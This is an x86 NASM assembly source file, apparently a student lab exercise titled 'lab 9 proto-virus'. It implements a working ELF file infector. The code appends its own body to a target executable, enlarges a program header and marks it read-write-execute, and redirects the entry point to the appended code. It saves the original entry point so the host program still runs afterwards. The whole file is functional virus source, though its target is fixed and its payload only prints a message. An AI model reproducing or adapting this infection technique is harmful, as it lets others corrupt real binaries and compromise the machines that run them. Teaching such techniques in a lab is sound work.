%macro	syscall1 2
	mov	ebx, %2
	mov	eax, %1
	int	0x80
%endmacro

%macro	syscall3 4
	mov	edx, %4
	mov	ecx, %3 
	mov	ebx, %2	
	mov	eax, %1 
	int	0x80
%endmacro

%macro  exit 1
	syscall1 1, %1
%endmacro

%macro  write 3
	syscall3 4, %1, %2, %3
%endmacro

%macro  read 3
	syscall3 3, %1, %2, %3
%endmacro

%macro  open 3
	syscall3 5, %1, %2, %3
%endmacro

%macro  lseek 3
	syscall3 19, %1, %2, %3
%endmacro

%macro  close 1
	syscall1 6, %1
%endmacro

%define	STK_RES	200
%define	RDWR	2
%define	SEEK_END 2
%define SEEK_CUR 1
%define SEEK_SET 0

%define ENTRY		24
%define PHDR_start	28
%define	PHDR_size	32
%define PHDR_memsize	20	
%define PHDR_filesize	16
%define	PHDR_offset	4
%define	PHDR_vaddr	8
%define stdin 0
%define stdout 1
%define map_start 0x08048000
	
	global _start

	section .text

_start:
	push ebp
	mov	ebp, esp
	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
	; You code for this lab goes here
	; macro eax,ebx,ecx,edx where they took care of eax already

	;step 1: print hello message
	pushad	;backup regs
	call get_my_loc
	add edx, OutStr - anchor
	mov eax,edx
	write stdout,eax,OutStrLen 	
	popad 	; restore regs
	;end of step 1

	;step 2: open FileName with RDWR
	pushad
	call get_my_loc
	add edx, FileName - anchor
	mov eax,edx					;edx is run over in macro
	open eax,RDWR,0777
	mov [ebp-4],eax		
	popad
	mov edi,[ebp-4] ;edi holds fd
	;end of step 2
	
	;step 3: check that the open succeeded, and that the file is an Elf
	cmp edi,0	;check if fd<0 which indicates error
	jl exit_failure

	;here we know no error occured, now lets elf check
	pushad
	mov eax,ebp
	sub eax,4
	read edi,eax ,4	;read from fd up to 4 bytes to stack
	popad

	xor eax,eax			;eax =0
	mov eax,0x464c457f	;little endian!
	mov ebx,[ebp-4]
	cmp ebx, eax		;check if elf 
	jne exit_failure	;not an elf
	;end of step 3 

	;step 4: attach the virus at the end of the file using sig: numberOfBytes lseek(seek_end)
	;seek end
	pushad
	lseek edi,0,SEEK_SET
	popad

	pushad
	lseek edi,0,SEEK_END	;put the cursor at the end of the file
	mov [ebp-4],eax
	popad
	mov ecx,[ebp-4]		;ecx has file length now
	;write all function to the end of the file
	pushad
	;get start loc
	call get_my_loc
	add edx,_start-anchor
	mov eax,edx
	write edi, eax, virus_end-_start
	popad
	;virus code appended to the end
	;end of step 4

	;code for task1
	pushad
	lseek edi,0,SEEK_SET	;put the cursor at the start of the file
	popad
	
	read_elf_header:
	pushad
	mov eax, ebp
	sub eax, 56
	mov ecx,eax
	read edi, ecx, 52 	;read 52 bytes from file
	popad

	task3:
	pushad						;backup regs
	mov [ebp-72], ecx			;[ebp-72] has the file size
	mov eax, ebp
	sub eax,56					;eax points to the start of ehdr
	add eax,PHDR_start			;eax points to the start of phdr
	;=====
	pushad
	lseek edi, [eax], SEEK_SET	;cursor on start of program headers
	popad
	;=====
	mov eax,[eax]				;eax = offset inside file of program headers
	mov [ebp-100],eax			;[ebp-100] is the offset in the file
	;inside start of phdr
	mov ebx,PHDR_size
	add ebx,ebx					;ebx = 2 * phdr size 
	mov eax,ebp					;eax is the pointer to the stack 
	sub eax,ebx					;eax = ebp - 2*phdr size ;;reserve place on stack 
	;sub eax,4
	;====
	pushad
	read edi, eax, ebx			;read into eax, 64 bytes (size of two headers)
	popad
	;====
	;eax = ebp - 2 * phdr size
	add eax, PHDR_size
	add eax, PHDR_vaddr
	mov ebx, [eax]				;ebx contains virtual address (map start)
	mov [ebp-104],ebx			;save virtual mapping

	sub eax, PHDR_vaddr
	;inside second ph
	add eax,PHDR_offset
	mov ecx,[eax]				;ecx has second ph offset
	mov [ebp-108],ecx			;save second ph offset
	mov ebx,virus_end-_start	;ebx holds virus size
	add ebx,[ebp-72]			;ebx holds file size(before infection) + virus size
	sub ebx,ecx					;ebx holds file size + virus size - PHDR_offset
	;;now lets rewrite second ph
	sub eax,PHDR_offset
	;eax is at second ph
	add eax,PHDR_filesize
	mov [eax], ebx
	sub eax,PHDR_filesize
	add eax,PHDR_memsize
	mov [eax], ebx
	;modfiy execute permissions
	add eax,4		;goto permissions in header
	mov dword [eax],7		;set execute read write permissions on
	;;second program header modified
	mov ebx,[ebp-100]			;ebx is the offset of ph in the file
	lseek edi,ebx,SEEK_SET		;goto that offset
	mov eax,ebp
	mov ebx,PHDR_size
	add ebx,ebx
	sub eax,ebx					;eax = ebp - 2 * phsize
	write edi,eax,ebx			;write modified program headers
	popad						;restore regs
	
	;=========================================
	;REWIND TO EHDR READ
	pushad
	lseek edi,0,SEEK_SET	;put the cursor at the start of the file
	popad
	
	read_elf_header2:
	pushad
	mov eax, ebp
	sub eax, 56
	read edi, eax, 52 	;read 52 bytes from file
	popad
	;===========================================

	;change entry to point to the virus
	mov eax,ebp
	sub eax,32				;eax holds entry point address
	mov esi, eax			;esi has the entry point itself -> esi saves the original e.point
	mov ebx, [ebp-104]		;ebx is the start of the virtual mapping
	add ebx, ecx			;ebx contains the new entry point(map start+filesize)
	sub ebx,[ebp-108]		;ebx = ebx - offset

	;seek 4 last bytes
	pushad
	lseek edi, -4, SEEK_END	;put the cursor 4 bytes before end of file
	popad

	;write prev entry to last 4 bytes
	pushad		
	write edi, esi, 4	;overwrite the original e.point to the last 4 bytes of the file 
	popad

	mov [eax], ebx	;change entry point in the stack

	;goto start of the file
	pushad
	lseek edi,0,SEEK_SET	;put the cursor at the start of the file
	popad
	
	;write the new header to the file
	pushad			;change entry point
	mov eax, ebp
	sub eax,56 
	write edi, eax, 52
	popad


	;now close file
	pushad
	close edi
	cmp eax,0			;check file closed appropriate
	jl exit_failure
	popad

	;now jump to exit, or original code
	call get_my_end_loc
	add edx, PreviousEntryPoint - anchor2
	jmp dword [edx]

	;step 5 : exit, already wrriten
VirusExit:
       exit 0            ; Termination if all is OK and no previous code to jump to
                         ; (also an example for use of above macros)
FileName:	db "ELFexec", 0
OutStr:		db "The lab 9 proto-virus strikes!", 10, 0
OutStrLen: equ $-OutStr
Failstr:    db "perhaps not", 10 , 0
FailStrLen: equ $-Failstr

get_my_loc:
	call anchor
anchor:
	pop edx
	ret

exit_failure:
	call get_my_loc
	add edx, Failstr - anchor
	mov ebx,edx				;ebx points to FailStr
	write stdout, ebx,FailStrLen
	call get_my_end_loc
	add edx,PreviousEntryPoint-anchor2
	jmp dword [edx]
	exit 1

get_my_end_loc:
	call anchor2
anchor2:
	pop edx
	ret

PreviousEntryPoint: dd VirusExit		;last 4 bytes!
virus_end:
